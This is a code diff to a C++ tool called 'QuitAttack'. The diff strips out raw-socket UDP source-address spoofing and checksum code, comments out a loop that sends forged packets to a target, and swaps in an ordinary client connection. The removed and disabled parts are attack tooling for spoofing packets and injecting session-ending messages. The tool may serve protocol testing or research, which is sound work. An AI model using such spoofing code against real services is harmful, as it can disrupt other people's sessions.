@@ -19,24 +19,12 @@
 #include <string.h>
 #include <netdb.h>
 
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <sys/socket.h>
 
-#include <net/if.h>
-#include <netinet/in_systm.h>
-#include <netinet/in.h>
-#include <netinet/ip.h>
-#include <netinet/udp.h>
-#include <netinet/ip_icmp.h>
-#include <netinet/tcp.h>
-
-#include <arpa/inet.h>
-
+#include "Client.hh"
 #include "Message.hh"
 
 
-#define HELP "Usage: QuitAttack [-c <client port>] [-p <server port>] [-n <seq num>] [-v <version>] -s <source> -t <target>"
+#define HELP "Usage: QuitAttack [-c <client port>] [-p <server port>] [-n <seq num>] [-v <version>] -t <target>"
 
 #define MAX_CLIENT_ID 255 // Version 1
     
@@ -54,63 +42,7 @@ void signalHandler(int signal){
 }
 
 
-/**
- * Pseudo header for calculating UDP checksum
- * Source: http://www.enderunix.org/docs/en/rawipspoof/ 
- */
-struct psd_udp {
-	struct in_addr src;
-	struct in_addr dst;
-	unsigned char pad;
-	unsigned char proto;
-	unsigned short udp_len;
-	struct udphdr udp;
-};
 
-/**
- * Calculate checksum
- * Source: http://www.enderunix.org/docs/en/rawipspoof/ 
- */
-unsigned short in_cksum(unsigned short *addr, int len);
-unsigned short in_cksum(unsigned short *addr, int len){
-	int nleft = len;
-	int sum = 0;
-	unsigned short *w = addr;
-	unsigned short answer = 0;
-    
-	while (nleft > 1) {
-		sum += *w++;
-		nleft -= 2;
-	}
-    
-	if (nleft == 1) {
-		*(unsigned char *) (&answer) = *(unsigned char *) w;
-		sum += answer;
-	}
-	
-	sum = (sum >> 16) + (sum & 0xFFFF);
-	sum += (sum >> 16);
-	answer = ~sum;
-	return (answer);
-}
-
-/**
- * Fills the IPv4 pseudo header and calculates the checksum
- * Source: http://www.enderunix.org/docs/en/rawipspoof/ 
- */
-unsigned short in_cksum_udp(int src, int dst, unsigned short *addr, int len);
-unsigned short in_cksum_udp(int src, int dst, unsigned short *addr, int len){
-	struct psd_udp buf;
-    
-	memset(&buf, 0, sizeof(struct psd_udp));
-	buf.src.s_addr = src;
-	buf.dst.s_addr = dst;
-	buf.pad = 0;
-	buf.proto = IPPROTO_UDP;
-	buf.udp_len = htons(len);
-	memcpy(&(buf.udp), addr, len);
-	return in_cksum((unsigned short *)&buf, 12 + len);
-}
 
 
 
@@ -126,6 +58,7 @@ int main (int argc, const char * argv[]){
     uint32_t seqnum = 0;
     string target;
     string source;
+	
     
 	// Long versions of command line parameters
     static struct option long_options[] = {
@@ -134,7 +67,6 @@ int main (int argc, const char * argv[]){
         {"seqnum", 	required_argument, 	0, 'n'},
 		{"version", required_argument, 	0, 'v'},
         {"target", required_argument, 	0, 't'},
-		{"source", required_argument, 	0, 's'},
         {"help", 	no_argument, 		0, 'h'},
         {0, 0, 0, 0}
     };
@@ -142,7 +74,7 @@ int main (int argc, const char * argv[]){
     int c;
     opterr = 0;
     // Use get_opt to parse command line parameters
-	while ((c = getopt_long (argc, (char **)argv, "hc:p:s:v:n:t:", long_options, NULL)) != -1){
+	while ((c = getopt_long (argc, (char **)argv, "hc:p:v:n:t:", long_options, NULL)) != -1){
         switch (c)
         {
             case 'c': // Client port
@@ -168,10 +100,6 @@ int main (int argc, const char * argv[]){
                 target = optarg;
                 cout << "Target address: " << target << endl;
                 break;
-            case 's': // Source address
-                source = optarg;
-                cout << "Source address: " << source << endl;
-                break;
             case 'h': // Help
                 cout << HELP << endl;
                 break;
@@ -188,15 +116,30 @@ int main (int argc, const char * argv[]){
     if (target.empty()) {
         cout << "Target missing" << endl << HELP << endl;
         return 0;
-    }
-    if (source.empty()) {
-        cout << "Source missing" << endl << HELP << endl;
-        return 0;
-    }   
+    } 
 
     // Add SIGINT handler
     signal(SIGINT, signalHandler);
     
+	
+	list<string> host;
+	host.push_back(target);
+	
+	// Start client first
+    Client* clientHandler = NULL;
+	try {
+		clientHandler = new Client(host, clientPort, serverPort, version, NULL);
+		clientHandler->start();
+		clientHandler->stop();
+	} catch (...) {
+		cout << "Creating client handler failed." << endl;
+		return 0;
+	}
+	
+	while(true){
+        sleep(1);
+    }
+	/*
     // Allocate headers from memory
 	char packet[2000];
     memset(packet, 0, 2000);
@@ -274,12 +217,12 @@ int main (int argc, const char * argv[]){
         cout << "." << flush;
 		
 		// TODO: Rotate attack payloads (clientID & seqnum)
-		/*
+		
 		for (int i = 0; i <= MAX_CLIENT_ID; i++) {
 			msg.setClientID(i);
 			msg.parseToBytes(packet + sizeof(struct ip) + sizeof(struct udphdr));
 		}
-		*/
+		
         if (sendto(sd, packet, totLen, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr)) < 0)  {
             perror("sendto");
             exit(1);
@@ -289,6 +232,6 @@ int main (int argc, const char * argv[]){
 		
         usleep(10000);
     }
-
+	*/
 	return 0;
 }
